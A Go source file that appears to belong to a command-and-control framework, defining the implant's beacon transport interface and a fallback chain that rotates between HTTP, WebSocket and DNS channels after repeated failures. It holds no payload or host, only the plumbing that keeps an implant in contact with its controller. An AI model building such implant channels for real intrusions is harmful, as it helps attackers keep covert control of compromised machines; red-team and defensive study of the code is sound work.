package transport

import (
	"github.com/natx6/ananse/src/c2/implant/beacon"
)

// Transport defines the interface for all C2 communication channels.
// Each transport implementation handles beaconing over a different protocol
// (HTTP, WebSocket, DNS) with automatic fallback.
type Transport interface {
	// Beacon sends a heartbeat and returns the server response.
	Beacon(hb *beacon.ImplantHeartbeat) (*beacon.BeaconResponse, error)

	// Name returns a short identifier for this transport (e.g. "http", "ws", "dns").
	Name() string

	// Close cleans up any transport-level resources.
	Close() error
}

// TransportChain holds an ordered list of transports with fallback logic.
type TransportChain struct {
	transports []Transport
	current    int
	failCount  int
}

// NewChain creates a transport chain from the given transports in priority order.
func NewChain(transports ...Transport) *TransportChain {
	return &TransportChain{
		transports: transports,
		current:    0,
		failCount:  0,
	}
}

// Beacon tries the current transport. After 3 consecutive failures it rotates
// to the next transport in the chain. On success it resets the count and rotates
// back to the primary transport.
func (tc *TransportChain) Beacon(hb *beacon.ImplantHeartbeat) (*beacon.BeaconResponse, error) {
	if len(tc.transports) == 0 {
		return nil, nil
	}

	// Clamp current index
	if tc.current >= len(tc.transports) {
		tc.current = 0
	}

	t := tc.transports[tc.current]
	resp, err := t.Beacon(hb)
	if err != nil {
		tc.failCount++
		if tc.failCount >= 3 && len(tc.transports) > 1 {
			// Rotate to next transport
			tc.current = (tc.current + 1) % len(tc.transports)
			tc.failCount = 0
		}
		return nil, err
	}

	// Success — reset fail count and rotate back toward primary
	tc.failCount = 0
	if tc.current > 0 {
		tc.current--
	}
	return resp, nil
}

// Close closes all transports in the chain.
func (tc *TransportChain) Close() error {
	var lastErr error
	for _, t := range tc.transports {
		if err := t.Close(); err != nil {
			lastErr = err
		}
	}
	return lastErr
}
